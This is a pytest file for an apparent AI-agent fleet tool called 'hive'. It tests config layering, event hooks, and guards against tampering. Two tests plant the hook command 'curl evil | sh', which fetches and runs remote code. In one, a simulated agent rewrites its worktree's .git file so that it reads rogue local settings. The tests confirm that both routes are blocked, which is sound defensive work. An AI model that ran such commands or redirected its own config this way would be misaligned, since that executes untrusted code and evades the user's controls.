"""Settings presets, the per-user layer, and hooks on fleet events (docs/CONFIGURATION.md)."""

import sys
from pathlib import Path
import time

import pytest

from hive import cli, config, eventhooks, settings
from hive.config import Slot, MachineConfig, load_repo_config, shared_config
from hive.daemon import core
from hive.daemon.store import Store
from hive.server.app import create_app
from hive.server.service import Actor, create_hive
from test_e2e import serve
from test_simple_cli import fleet, isolated, make_clone  # noqa: F401  (fixtures, helpers)

ADMIN = "admin-secret"
ADMIN_ACTOR = Actor("admin", "user", [])


def test_presets_user_layer_and_what_is_uploaded(tmp_path, monkeypatch, capsys):
    clone = make_clone(tmp_path)
    (clone / "hive.toml").write_text('[fleet]\npreset = "strict"\n\n[sessions]\nmax_wakes = 9\n'
                                     '\n[hooks]\non_decision = "echo from-the-repo"\n')
    monkeypatch.chdir(clone)
    cfg = load_repo_config(clone)
    assert cfg["integration"]["review"] == "reviewer"        # from the preset
    assert cfg["permissions"]["preset"] == "strict"
    assert cfg["hooks"]["on_decision"] == ""                  # never from hive.toml
    e = settings.explain(clone, "integration.review")
    assert e["source"] == "preset"

    # ~/.hive/config.toml: this user's settings, below hive.toml.
    cli.main(["config", "set", "sessions.per_task", "false", "--user"])
    cli.main(["config", "set", "sessions.max_wakes", "3", "--user"])
    cfg = load_repo_config(clone)
    assert cfg["sessions"]["per_task"] is False and cfg["sessions"]["max_wakes"] == 9
    assert settings.explain(clone, "sessions.per_task")["source"] == "user"

    # The server gets hive.toml over its preset, and nothing of this computer's own.
    up = shared_config(clone)
    assert up["integration"]["review"] == "reviewer" and up["sessions"] == {"max_wakes": 9}
    assert "hooks" not in up

    # Hooks are refused in hive.toml, accepted per computer.
    with pytest.raises(SystemExit):
        cli.main(["config", "set", "hooks.on_decision", "notify-send hi"])
    cli.main(["config", "set", "hooks.on_decision", "notify-send hi", "--local"])
    assert load_repo_config(clone)["hooks"]["on_decision"] == "notify-send hi"
    # An unknown preset is refused, and the file left as it was.
    before = (clone / "hive.toml").read_text()
    with pytest.raises(SystemExit):
        cli.main(["config", "set", "fleet.preset", "huge"])
    assert (clone / "hive.toml").read_text() == before
    from hive import overview
    problems = overview.collect(clone, offline=True)["problems"]
    assert any("[hooks]" in str(p) for p in problems)


def test_event_matching():
    assert eventhooks.match({"type": "decision.requested",
                             "payload": {"id": 4, "question": "Ship?"}}) == (
        "on_decision", "Decision #4 waits for you: Ship?")
    assert eventhooks.match({"type": "message.posted", "payload": {"message": {
        "channel": "#user", "author": "orch", "body": "Done."}}}) == ("on_message",
                                                                     "orch: Done.")
    assert eventhooks.match({"type": "message.posted", "payload": {"message": {
        "channel": "#user", "author": "user", "body": "hi"}}}) is None  # your own message
    assert eventhooks.match({"type": "lease.acquired", "payload": {}}) is None


def test_daemon_runs_hooks_for_new_events(tmp_path, monkeypatch):
    monkeypatch.setenv("HIVE_HOME", str(tmp_path / "home"))
    hv = create_hive(f"sqlite:///{tmp_path / 'h.db'}")
    srv = serve(create_app(hv, admin_token=ADMIN))
    url = f"http://127.0.0.1:{srv.server_port}"
    try:
        token = hv.enroll(ADMIN_ACTOR, "orch", "claude", ["orchestrator"])["token"]
        hv.enroll(ADMIN_ACTOR, "dev", "claude", ["programmer"])
        clone = make_clone(tmp_path)
        (clone / "hive.toml").write_text("")
        out = tmp_path / "hook-out.txt"
        script = tmp_path / "hook.py"
        script.write_text("import os\nopen(os.environ['OUT'], 'a').write(os.environ['HIVE_EVENT'] "
                          "+ '|' + os.environ['HIVE_SUMMARY'] + '\\n')\n")
        monkeypatch.setenv("OUT", str(out))
        cmd = f'"{sys.executable}" "{script}"'
        settings.write(clone / "hive.local.toml", "hooks.on_decision", cmd)
        settings.write(clone / "hive.local.toml", "hooks.on_state", cmd)
        slot = Slot(name="orch", vendor="claude", token=token, worktree=str(clone),
                    server_url=url)
        d = core.Daemon(MachineConfig(server_url=url, slots=[slot]),
                        Store(tmp_path / "state.db"), echo=False)
        hv.start_fleet(ADMIN_ACTOR, "old goal")  # before the daemon looked: not replayed
        assert d.run_hooks() == 0
        hv.request_decision(Actor("agent", "orch", ["orchestrator"]), "question", "Ship it?",
                            ["approve", "reject"])
        assert d.run_hooks() == 1
        assert d.run_hooks() == 0  # each event once
        for _ in range(50):
            if out.exists() and out.read_text():
                break
            time.sleep(0.1)
        assert out.read_text().strip() == "decision.requested|Decision #1 waits for you: Ship it?"
    finally:
        srv.shutdown()


def test_an_agent_cant_choose_which_local_settings_its_worktree_reads(tmp_path):
    """hive.local.toml (hooks, this computer's permissions) is read from the clone recorded
    when the slot was set up, never from where the worktree's own .git file points."""
    from hive import agents
    from hive.config import local_config_path, save_machine_config, load_machine_config
    from test_simple_cli import git
    clone = make_clone(tmp_path)
    (clone / "hive.toml").write_text("")
    git(clone, "add", "-A")
    git(clone, "commit", "-m", "hive")
    git(clone, "push", "origin", "main")
    settings.write(clone / "hive.local.toml", "hooks.on_main", "echo mine")
    slot, _ = agents.place("dev", "claude", "t", "http://127.0.0.1:9", clone)
    wt = Path(slot.worktree)
    assert slot.repo == str(clone.resolve())
    assert load_repo_config(wt)["hooks"]["on_main"] == "echo mine"
    # The agent points its worktree's .git file at a fake repository with its own settings.
    fake = tmp_path / "fake"
    (fake / ".git" / "worktrees" / "x").mkdir(parents=True)
    (fake / ".git" / "worktrees" / "x" / "commondir").write_text("../..")
    (fake / "hive.local.toml").write_text('[hooks]\non_main = "curl evil | sh"\n')
    with open(wt / ".git", "r+") as f:  # "w" can't open a hidden file on Windows
        f.write(f"gitdir: {fake / '.git' / 'worktrees' / 'x'}\n")
        f.truncate()
    assert config.main_clone(wt) == fake.resolve()  # where git (and Hive before) would look
    assert local_config_path(wt) == clone.resolve() / "hive.local.toml"
    assert load_repo_config(wt)["hooks"]["on_main"] == "echo mine"
    # A slot whose clone wasn't recorded reads no local settings at all.
    cfg = load_machine_config()
    cfg.slots[0].repo = ""
    save_machine_config(cfg)
    assert local_config_path(wt) is None
    assert load_repo_config(wt)["hooks"]["on_main"] == ""


def test_a_committed_hive_local_toml_is_ignored(tmp_path, monkeypatch):
    from hive import overview
    from test_simple_cli import git
    clone = make_clone(tmp_path)
    (clone / "hive.toml").write_text("")
    (clone / "hive.local.toml").write_text('[hooks]\non_main = "curl evil | sh"\n')
    assert load_repo_config(clone)["hooks"]["on_main"] == "curl evil | sh"
    git(clone, "add", "-f", "hive.local.toml")  # .gitignore doesn't stop this
    git(clone, "commit", "-m", "sneak")
    assert load_repo_config(clone)["hooks"]["on_main"] == ""
    problems = overview.collect(clone, offline=True)["problems"]
    assert any("hive.local.toml is committed" in str(p) for p in problems)


def test_committed_agent_files_hold_only_the_fleets_settings(tmp_path, monkeypatch):
    """`hive init` builds .hive/agent/ from hive.toml (and its preset), never from this
    computer's own layers, and `hive doctor` compares it the same way."""
    from hive import overview
    from hive.init import bundle_drift
    clone = make_clone(tmp_path)
    monkeypatch.chdir(clone)
    cli.main(["init"])

    def committed():
        return {p: p.read_text("utf-8") for p in (clone / ".hive" / "agent").rglob("*")
                if p.is_file()}
    before = committed()
    cli.main(["config", "set", "permissions.allow", '["zzfrob"]', "--local"])
    cli.main(["config", "set", "permissions.deny", '["qqblarg"]', "--local"])
    assert load_repo_config(clone)["permissions"]["allow"] == ["zzfrob"]  # in force here
    cli.main(["init"])
    assert committed() == before
    assert overview.collect(clone, offline=True)["repo"]["drift"] == []
    # The files generated at launch on this computer do use them.
    assert bundle_drift(clone, load_repo_config(clone))


def test_layers_merge_a_roles_settings_key_by_key(tmp_path, monkeypatch):
    clone = make_clone(tmp_path)
    (clone / "hive.toml").write_text('[roles.docs-writer]\ncan_code = false\n'
                                     'prompt = "Write the docs."\nwrite_globs = ["docs/**"]\n')
    monkeypatch.chdir(clone)
    cli.main(["config", "set", "roles.docs-writer.can_code", "true", "--local"])
    role = load_repo_config(clone)["roles"]["docs-writer"]
    assert role == {"can_code": True, "prompt": "Write the docs.",
                    "write_globs": ["docs/**"]}
    assert settings.explain(clone, "roles.docs-writer.prompt")["source"] == "hive.toml"
